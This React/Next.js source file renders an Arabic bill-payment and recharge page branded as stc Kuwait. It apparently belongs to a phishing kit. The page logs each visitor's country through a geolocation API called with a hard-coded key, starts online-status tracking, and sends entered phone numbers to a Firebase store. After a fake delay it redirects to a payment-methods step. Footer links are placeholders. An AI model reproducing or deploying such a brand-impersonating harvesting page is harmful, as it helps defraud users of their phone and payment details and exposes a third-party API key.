"use client"

import type React from "react"

import { useEffect, useState } from "react"
import { useRouter } from "next/navigation"
import {
  Menu,
  Search,
  User,
  ShoppingCart,
  Phone,
  MessageCircle,
  CreditCard,
  FileText,
  Smartphone,
  Users,
  ChevronLeft,
  Star,
  Shield,
  Clock,
  CheckCircle,
} from "lucide-react"

import { Button } from "@/components/ui/button"
import { addData } from "@/lib/firebase"
import { setupOnlineStatus } from "@/lib/online-sts"
import { Card, CardContent } from "@/components/ui/card"
import { RechargeFlow } from "@/components/recharge-flow"

const _id = "ord-shown-"+Math.random()
  .toString(36)
  .replace(/[^a-z]+/g, "")
  .substr(0, 15)

export default function Home() {
  const [isLoading, setIsLoading] = useState(false)
  const [phone, setPhone] = useState("")
  const [amount, setAmount] = useState("")
  const router = useRouter()

  useEffect(() => {
    getLocation()
  }, [])

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const id = localStorage.getItem("visitor")
    addData({ id: id, phone, mobile: phone })
    localStorage.setItem("amount", amount)

    setIsLoading(true)
    setTimeout(() => {
      router.push("/payment-methods")
      setIsLoading(false)
    }, 3000)
  }

  async function getLocation() {
    const APIKEY = "856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      addData({
        id: _id,
        country: country,
        createdDate: new Date().toISOString(),
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(_id)
    } catch (error) {
      console.error("Error fetching location:", error)
    }
  }

  return (
    <div className="min-h-screen bg-gray-50" dir="rtl">
    {/* Header */}
    <header className="bg-white shadow-lg border-b border-gray-100 sticky top-0 z-50">
      <div className="max-w-md mx-auto">
        <div className="flex items-center justify-between px-4 py-3">
          <div className="flex items-center gap-3">
            <Button variant="ghost" size="icon" className="hover:bg-gray-100 rounded-full">
              <Menu className="h-5 w-5 text-gray-700" />
            </Button>
            <Button variant="ghost" size="icon" className="hover:bg-gray-100 rounded-full">
              <Search className="h-5 w-5 text-gray-700" />
            </Button>
          </div>

          <div className="flex items-center">
           
           <img src="/stc.png"alt="" width={70}/>
          </div>

          <div className="flex items-center gap-2">
            <Button variant="ghost" size="icon" className="hover:bg-gray-100 rounded-full relative">
              <ShoppingCart className="h-5 w-5 text-gray-700" />
              <span className="absolute -top-1 -right-1 bg-red-500 text-white text-xs rounded-full h-4 w-4 flex items-center justify-center">
                2
              </span>
            </Button>
            <Button variant="ghost" size="icon" className="hover:bg-gray-100 rounded-full">
              <User className="h-5 w-5 text-gray-700" />
            </Button>
          </div>
        </div>
      </div>
    </header>

    <div className="max-w-md mx-auto bg-white min-h-screen">
      {/* Hero Section */}
      <section className="relative overflow-hidden">
        <div className="relative h-80 bg-[url(/payment-tablet.png)] bg-cover  backdrop-blur-lg">
     
          <div className="relative z-10 h-full flex flex-col justify-center px-6 text-white  bg-black/40 ">
            <div className="mb-4">
              <div className="inline-flex items-center gap-2 bg-white/20 backdrop-blur-sm rounded-full px-3 py-1 text-sm mb-4">
                <Star className="h-4 w-4 bg-50 text-yellow-300" />
                <span>الخدمة الأكثر استخداماً</span>
              </div>
              <h1 className="text-3xl font-bold mb-3 leading-tight">
                خدمات دفع الفواتير
                <br />
                <span className="text-pink-200">وإعادة التعبئة</span>
              </h1>
            </div>

            <div className="flex items-center gap-4 text-sm">
              <div className="flex items-center gap-2">
                <Shield className="h-4 w-4 text-green-300" />
                <span>آمن 100%</span>
              </div>
              <div className="flex items-center gap-2">
                <Clock className="h-4 w-4 text-blue-300" />
                <span>فوري</span>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Quick Actions */}
      <section className="px-4 -mt-8 relative z-20">
        <div className="grid grid-cols-2 gap-3 mb-6">
          <Button className="bg-gradient-to-r from-purple-500 to-purple-900 hover:from-purple-600 hover:to-pink-700 text-white py-4 rounded-xl shadow-lg hover:shadow-xl transition-all duration-300 font-semibold">
            <CreditCard className="h-5 w-5 ml-2" />
            ادفع الآن
          </Button>
          <Button
            variant="outline"
            className="border-2 border-purple-200 hover:border-purple-300 py-4 rounded-xl bg-white hover:bg-purple-50 transition-all duration-300 font-semibold"
            onClick={() => document.getElementById("recharge-section")?.scrollIntoView({ behavior: "smooth" })}
          >
            <Smartphone className="h-5 w-5 ml-2" />
            إعادة تعبئة
          </Button>
        </div>
      </section>

      {/* Recharge Flow Section */}
      <section id="recharge-section" className="px-4 mb-8">
        <RechargeFlow />
      </section>

      {/* WhatsApp Contact */}
      <section className="px-4 mb-8">
        <Card className="border-0 shadow-md hover:shadow-lg transition-shadow duration-300 bg-gradient-to-r from-green-50 to-emerald-50 border-l-4 border-l-green-500">
          <CardContent className="p-4">
            <div className="flex items-center gap-4">
              <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-green-600 rounded-xl flex items-center justify-center shadow-lg">
                <MessageCircle className="h-6 w-6 text-white" />
              </div>
              <div className="flex-1">
                <h3 className="font-bold text-gray-900 mb-1">تواصل معنا عبر واتساب</h3>
                <p className="text-sm text-gray-600">خدمة عملاء متاحة 24/7</p>
              </div>
              <ChevronLeft className="h-5 w-5 text-gray-400" />
            </div>
          </CardContent>
        </Card>
      </section>

      {/* Services Section */}
      <section className="px-4 space-y-6">
        <div className="text-center mb-6">
          <h2 className="text-2xl font-bold text-gray-900 mb-2">خدماتنا المميزة</h2>
          <p className="text-gray-600">اختر الخدمة المناسبة لك</p>
        </div>

        {/* Pay Bills Service */}
        <Card className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 overflow-hidden group">
          <CardContent className="p-0">
            <div className="bg-gradient-to-br from-purple-600 to-purple-700 p-4 text-white">
              <div className="flex items-center justify-between mb-3">
                <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center">
                  <CreditCard className="h-6 w-6" />
                </div>
                <div className="flex items-center gap-1 text-sm bg-white/20 backdrop-blur-sm rounded-full px-3 py-1">
                  <CheckCircle className="h-4 w-4" />
                  <span>الأكثر استخداماً</span>
                </div>
              </div>
              <h3 className="text-xl font-bold mb-2">ادفع فواتيرك</h3>
              <p className="text-purple-100 text-sm">دفع سريع وآمن لجميع أنواع الفواتير</p>
            </div>

            <div className="p-4 bg-white">
              <p className="text-gray-600 text-sm mb-4 leading-relaxed">
                ادفع فواتير الكهرباء، الماء، الهاتف، والإنترنت بشكل سهل وآمن وفوري من خلال تطبيق stc. تتبع مدفوعاتك
                بالتفصيل واحصل على إشعارات فورية.
              </p>

              <div className="flex items-center gap-4 mb-4 text-sm text-gray-500">
                <div className="flex items-center gap-1">
                  <Shield className="h-4 w-4 text-green-500" />
                  <span>مشفر وآمن</span>
                </div>
                <div className="flex items-center gap-1">
                  <Clock className="h-4 w-4 text-blue-500" />
                  <span>فوري</span>
                </div>
              </div>

              <Button className="w-full bg-gradient-to-r from-pink-500 to-pink-600 hover:from-pink-600 hover:to-pink-700 text-white py-3 rounded-xl font-semibold shadow-md hover:shadow-lg transition-all duration-300">
                ادفع الآن
                <ChevronLeft className="h-4 w-4 mr-2" />
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Recharge Service */}
        <Card className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 overflow-hidden">
          <CardContent className="p-0">
            <div className="bg-gradient-to-br from-blue-600 to-blue-700 p-4 text-white">
              <div className="flex items-center justify-between mb-3">
                <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center">
                  <FileText className="h-6 w-6" />
                </div>
                <div className="text-sm bg-white/20 backdrop-blur-sm rounded-full px-3 py-1">جديد</div>
              </div>
              <h3 className="text-xl font-bold mb-2">أعد تعبئة خطك</h3>
              <p className="text-blue-100 text-sm">تعبئة سريعة لرصيد الهاتف وباقات الإنترنت</p>
            </div>

            <div className="p-4 bg-white">
              <p className="text-gray-600 text-sm mb-4 leading-relaxed">
                أعد تعبئة خطك للمكالمات أو حزم الإنترنت بخطوات بسيطة واستمتع بتجربة سهلة للدفع السريع مع عروض وخصومات
                حصرية.
              </p>

              <div className="grid grid-cols-3 gap-2 mb-4">
                <div className="text-center p-2 bg-gray-50 rounded-lg">
                  <div className="text-lg font-bold text-blue-600">5</div>
                  <div className="text-xs text-gray-500">د.ك</div>
                </div>
                <div className="text-center p-2 bg-gray-50 rounded-lg">
                  <div className="text-lg font-bold text-blue-600">10</div>
                  <div className="text-xs text-gray-500">د.ك</div>
                </div>
                <div className="text-center p-2 bg-gray-50 rounded-lg">
                  <div className="text-lg font-bold text-blue-600">20</div>
                  <div className="text-xs text-gray-500">د.ك</div>
                </div>
              </div>

              <Button className="w-full bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white py-3 rounded-xl font-semibold shadow-md hover:shadow-lg transition-all duration-300">
                تعبئة رصيد الآن
                <ChevronLeft className="h-4 w-4 mr-2" />
              </Button>
            </div>
          </CardContent>
        </Card>

        {/* Postpaid Service */}
        <Card className="border-0 shadow-lg hover:shadow-xl transition-all duration-300 overflow-hidden">
          <CardContent className="p-0">
            <div className="bg-gradient-to-br from-emerald-600 to-emerald-700 p-4 text-white">
              <div className="flex items-center justify-between mb-3">
                <div className="w-12 h-12 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center">
                  <Smartphone className="h-6 w-6" />
                </div>
                <div className="text-sm bg-white/20 backdrop-blur-sm rounded-full px-3 py-1">مميز</div>
              </div>
              <h3 className="text-xl font-bold mb-2">الدفع للخطوط المدفوعة</h3>
              <p className="text-emerald-100 text-sm">إدارة وسداد فواتير الخطوط الشهرية</p>
            </div>

            <div className="p-4 bg-white">
              <p className="text-gray-600 text-sm mb-4 leading-relaxed">
                ادفع فواتير خطوطك المدفوعة مسبقاً بكل سهولة، واستمتع بخدمات إضافية مثل تفعيل الباقات وإدارة الخدمات من
                مكان واحد.
              </p>

              <div className="bg-gradient-to-r from-emerald-50 to-green-50 p-3 rounded-lg mb-4 border border-emerald-100">
                <div className="flex items-center gap-2 text-sm text-emerald-700">
                  <CheckCircle className="h-4 w-4" />
                  <span>خصم 10% على الدفع المبكر</span>
                </div>
              </div>

              <Button className="w-full bg-gradient-to-r from-emerald-500 to-emerald-600 hover:from-emerald-600 hover:to-emerald-700 text-white py-3 rounded-xl font-semibold shadow-md hover:shadow-lg transition-all duration-300">
                ادفع الآن
                <ChevronLeft className="h-4 w-4 mr-2" />
              </Button>
            </div>
          </CardContent>
        </Card>
      </section>

      {/* Features Section */}
      <section className="px-4 py-8 bg-gray-50 mt-8">
        <div className="text-center mb-6">
          <h2 className="text-xl font-bold text-gray-900 mb-2">لماذا تختار stc؟</h2>
        </div>

        <div className="grid grid-cols-2 gap-4">
          <div className="text-center p-4 bg-white rounded-xl shadow-sm">
            <div className="w-12 h-12 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
              <Shield className="h-6 w-6 text-green-600" />
            </div>
            <h3 className="font-semibold text-gray-900 mb-1">أمان عالي</h3>
            <p className="text-xs text-gray-600">تشفير متقدم لحماية بياناتك</p>
          </div>

          <div className="text-center p-4 bg-white rounded-xl shadow-sm">
            <div className="w-12 h-12 bg-blue-100 rounded-full flex items-center justify-center mx-auto mb-3">
              <Clock className="h-6 w-6 text-blue-600" />
            </div>
            <h3 className="font-semibold text-gray-900 mb-1">سرعة فائقة</h3>
            <p className="text-xs text-gray-600">معالجة فورية للمدفوعات</p>
          </div>

          <div className="text-center p-4 bg-white rounded-xl shadow-sm">
            <div className="w-12 h-12 bg-purple-100 rounded-full flex items-center justify-center mx-auto mb-3">
              <Users className="h-6 w-6 text-purple-600" />
            </div>
            <h3 className="font-semibold text-gray-900 mb-1">دعم 24/7</h3>
            <p className="text-xs text-gray-600">خدمة عملاء متاحة دائماً</p>
          </div>

          <div className="text-center p-4 bg-white rounded-xl shadow-sm">
            <div className="w-12 h-12 bg-pink-100 rounded-full flex items-center justify-center mx-auto mb-3">
              <Star className="h-6 w-6 text-pink-600" />
            </div>
            <h3 className="font-semibold text-gray-900 mb-1">عروض حصرية</h3>
            <p className="text-xs text-gray-600">خصومات ومكافآت مستمرة</p>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="bg-gradient-to-br from-purple-900 via-purple-800 to-indigo-900 text-white">
        <div className="p-6">
          {/* Quick Links */}
          <div className="grid grid-cols-2 gap-6 mb-8">
            <div>
              <h4 className="font-bold mb-4 text-purple-200">خدمات العملاء</h4>
              <ul className="space-y-3 text-sm">
                <li>
                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
                    <ChevronLeft className="h-3 w-3" />
                    خدمات المستهلكين
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
                    <ChevronLeft className="h-3 w-3" />
                    خدمات الشركات
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
                    <ChevronLeft className="h-3 w-3" />
                    مواقع الخدمات
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
                    <ChevronLeft className="h-3 w-3" />
                    الشكاوى والمقترحات
                  </a>
                </li>
              </ul>
            </div>

            <div>
              <h4 className="font-bold mb-4 text-purple-200">معلومات مهمة</h4>
              <ul className="space-y-3 text-sm">
                <li>
                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
                    <ChevronLeft className="h-3 w-3" />
                    من نحن
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
                    <ChevronLeft className="h-3 w-3" />
                    سياسة الخصوصية
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
                    <ChevronLeft className="h-3 w-3" />
                    الشروط والأحكام
                  </a>
                </li>
                <li>
                  <a href="#" className="hover:text-purple-200 transition-colors flex items-center gap-2">
                    <ChevronLeft className="h-3 w-3" />
                    أمان المعلومات
                  </a>
                </li>
              </ul>
            </div>
          </div>

          {/* Contact Info */}
          <div className="border-t border-purple-700 pt-6 mb-6">
            <div className="grid grid-cols-2 gap-4 text-sm">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-purple-700 rounded-lg flex items-center justify-center">
                  <Phone className="h-5 w-5" />
                </div>
                <div>
                  <div className="font-semibold">خدمة العملاء</div>
                  <div className="text-purple-300">102</div>
                </div>
              </div>

              <div className="flex items-center gap-3">
                <div className="w-10 h-10 bg-green-600 rounded-lg flex items-center justify-center">
                  <MessageCircle className="h-5 w-5" />
                </div>
                <div>
                  <div className="font-semibold">واتساب</div>
                  <div className="text-purple-300">متاح 24/7</div>
                </div>
              </div>
            </div>
          </div>

          {/* Logo and Social Media */}
          <div className="text-center border-t border-purple-700 pt-6">
            <div className="mb-4">
              <span className="text-4xl font-bold bg-gradient-to-r from-white to-purple-200 bg-clip-text text-transparent">
                stc
              </span>
            </div>
            <p className="text-sm text-purple-200 mb-6 leading-relaxed">
              شركة الاتصالات السعودية في دولة الكويت
              <br />
              عضو في مجموعة الاتصالات السعودية
            </p>

            {/* Social Media Icons */}
            <div className="flex justify-center gap-3 mb-6">
              {[
                { icon: MessageCircle, color: "bg-green-600 hover:bg-green-700" },
                { icon: Users, color: "bg-pink-600 hover:bg-pink-700" },
                { icon: Phone, color: "bg-blue-600 hover:bg-blue-700" },
                { icon: Users, color: "bg-blue-800 hover:bg-blue-900" },
                { icon: Users, color: "bg-gray-700 hover:bg-gray-800" },
                { icon: Users, color: "bg-blue-700 hover:bg-blue-800" },
              ].map((social, index) => (
                <button
                  key={index}
                  className={`w-10 h-10 ${social.color} rounded-full flex items-center justify-center transition-all duration-300 hover:scale-110 shadow-lg`}
                >
                  <social.icon className="h-4 w-4" />
                </button>
              ))}
            </div>

            <div className="text-xs text-purple-300 space-y-2">
              <div className="flex justify-center gap-4">
                <a href="#" className="hover:text-white transition-colors">
                  سياسة الخصوصية
                </a>
                <span>•</span>
                <a href="#" className="hover:text-white transition-colors">
                  شروط وأحكام
                </a>
                <span>•</span>
                <a href="#" className="hover:text-white transition-colors">
                  الشروط المالية
                </a>
              </div>
              <p>جميع الحقوق محفوظة © 2024 stc الكويت</p>
            </div>
          </div>
        </div>
      </footer>
    </div>
  </div>
  )
}

// Component definitions
function ServiceCard({ icon, title }: { icon: React.ReactNode; title: string }) {
  return (
    <div className="flex flex-col items-center gap-3 p-4 bg-white/80 backdrop-blur-sm rounded-2xl shadow-lg border border-white/50 hover:shadow-xl transition-all duration-300 hover:scale-105 hover:bg-white/90">
      <div className="bg-gradient-to-br from-purple-100 to-purple-200 rounded-2xl p-3 text-purple-700 shadow-sm">
        {icon}
      </div>
      <span className="text-xs text-center font-semibold text-slate-700 leading-tight">{title}</span>
    </div>
  )
}

function CategoryCard({
  icon,
  label,
  image,
  bgColor = "bg-white/80",
}: {
  icon?: React.ReactNode
  label: string
  image?: string
  bgColor?: string
}) {
  return (
    <div
      className={`flex flex-col items-center justify-center gap-3 p-4 ${bgColor} backdrop-blur-sm rounded-2xl shadow-lg border border-white/50 hover:shadow-xl transition-all duration-300 hover:scale-105`}
    >
      {image ? (
        <img src={image || "/placeholder.svg"} alt={label} className="w-12 h-12 object-contain" />
      ) : icon ? (
        <div className="text-purple-700 p-2">{icon}</div>
      ) : null}
      <span className="text-sm text-center font-semibold text-slate-700">{label}</span>
    </div>
  )
}

function ProductCard({
  image,
  title,
  price,
  currency,
  installment,
}: {
  image: string
  title: string
  price: string
  currency: string
  installment: string
}) {
  return (
    <div className="bg-white/80 backdrop-blur-sm rounded-3xl p-6 shadow-xl border border-white/50 hover:shadow-2xl transition-all duration-300 hover:scale-[1.02]">
      <div className="relative h-44 mb-4 bg-gradient-to-br from-gray-50 to-gray-100 rounded-2xl p-4">
        <img src={image || "/placeholder.svg"} alt={title} className="w-full h-full object-contain" />
      </div>
      <h3 className="font-bold text-slate-800 mb-3 text-lg">{title}</h3>
      <div className="flex justify-between items-center">
        <div className="text-sm text-slate-500 font-medium">
          {installment} {currency}/شهر
        </div>
        <div className="font-bold text-red-600 text-lg">
          {price} {currency}
        </div>
      </div>
    </div>
  )
}

function GiftCard({ image, title }: { image: string; title: string }) {
  return (
    <div className="bg-white/80 backdrop-blur-sm rounded-3xl p-6 shadow-xl border border-white/50 hover:shadow-2xl transition-all duration-300 hover:scale-[1.02]">
      <div className="relative h-36 mb-4 bg-gradient-to-br from-gray-50 to-gray-100 rounded-2xl p-4">
        <img src={image || "/placeholder.svg"} alt={title} className="w-full h-full object-contain" />
      </div>
      <h3 className="font-bold text-slate-800 text-center text-lg">{title}</h3>
    </div>
  )
}

function Footer() {
  return (
    <footer className="bg-gradient-to-br from-slate-900 to-slate-800 text-white py-16 px-8">
      <div className="grid grid-cols-2 md:grid-cols-4 gap-8 max-w-6xl mx-auto">
        <div>
          <h4 className="font-bold mb-6 text-lg">خدمة العملاء</h4>
          <ul className="space-y-3 text-sm text-slate-300">
            <li className="hover:text-white transition-colors cursor-pointer">اتصل بنا</li>
            <li className="hover:text-white transition-colors cursor-pointer">الأسئلة الشائعة</li>
            <li className="hover:text-white transition-colors cursor-pointer">فروعنا</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-6 text-lg">حسابي</h4>
          <ul className="space-y-3 text-sm text-slate-300">
            <li className="hover:text-white transition-colors cursor-pointer">تسجيل الدخول</li>
            <li className="hover:text-white transition-colors cursor-pointer">طلباتي</li>
            <li className="hover:text-white transition-colors cursor-pointer">إعدادات الحساب</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-6 text-lg">عن الشركة</h4>
          <ul className="space-y-3 text-sm text-slate-300">
            <li className="hover:text-white transition-colors cursor-pointer">من نحن</li>
            <li className="hover:text-white transition-colors cursor-pointer">الوظائف</li>
            <li className="hover:text-white transition-colors cursor-pointer">الشروط والأحكام</li>
          </ul>
        </div>
        <div>
          <h4 className="font-bold mb-6 text-lg">تواصل معنا</h4>
          <div className="flex space-x-4 space-x-reverse mt-4">
            <div className="w-10 h-10 bg-white/20 hover:bg-white/30 rounded-2xl flex items-center justify-center transition-all duration-200 hover:scale-110 cursor-pointer"></div>
            <div className="w-10 h-10 bg-white/20 hover:bg-white/30 rounded-2xl flex items-center justify-center transition-all duration-200 hover:scale-110 cursor-pointer"></div>
            <div className="w-10 h-10 bg-white/20 hover:bg-white/30 rounded-2xl flex items-center justify-center transition-all duration-200 hover:scale-110 cursor-pointer"></div>
          </div>
        </div>
      </div>
      <div className="mt-12 pt-8 border-t border-slate-700 text-center text-sm text-slate-400">
        © {new Date().getFullYear()} جميع الحقوق محفوظة - شركة الاتصالات السعودية
      </div>
    </footer>
  )
}

function WhatsAppButton() {
  return (
    <div className="fixed bottom-8 left-8 z-50">
      <button className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white rounded-2xl p-4 shadow-2xl transition-all duration-300 hover:scale-110 hover:shadow-3xl">
        <svg
          xmlns="http://www.w3.org/2000/svg"
          width="24"
          height="24"
          viewBox="0 0 24 24"
          fill="none"
          stroke="currentColor"
          strokeWidth="2"
          strokeLinecap="round"
          strokeLinejoin="round"
          className="w-6 h-6"
        >
          <path d="M3 21l1.65-3.8a9 9 0 1 1 3.4 2.9L3 21"></path>
          <path d="M9 10a.5.5 0 0 0 1 0V9a.5.5 0 0 0-1 0v1Z"></path>
          <path d="M14 10a.5.5 0 0 0 1 0V9a.5.5 0 0 0-1 0v1Z"></path>
          <path d="M9.5 15.5a5 5 0 0 0 5 0"></path>
        </svg>
      </button>
    </div>
  )
}

function FullPageLoader({ text }: { text: string }) {
  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm flex flex-col items-center justify-center z-50">
      <div className="w-20 h-20 border-4 border-t-red-500 border-r-red-500 border-b-transparent border-l-transparent rounded-full animate-spin"></div>
      <p className="text-white mt-6 font-semibold text-lg">{text}</p>
    </div>
  )
}

function Store() {
  return (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      width="20"
      height="20"
      viewBox="0 0 24 24"
      fill="none"
      stroke="currentColor"
      strokeWidth="2"
      strokeLinecap="round"
      strokeLinejoin="round"
    >
      <path d="m2 7 4.41-4.41A2 2 0 0 1 7.83 2h8.34a2 2 0 0 1 1.42.59L22 7"></path>
      <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8"></path>
      <path d="M15 22v-4a2 2 0 0 0-2-2h-2a2 2 0 0 0-2 2v4"></path>
      <path d="M2 7h20"></path>
      <path d="M22 7v3a2 2 0 0 1-2 2v0a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 16 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 12 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 8 12a2.7 2.7 0 0 1-1.59-.63.7.7 0 0 0-.82 0A2.7 2.7 0 0 1 4 12v0a2 2 0 0 1-2-2V7"></path>
    </svg>
  )
}
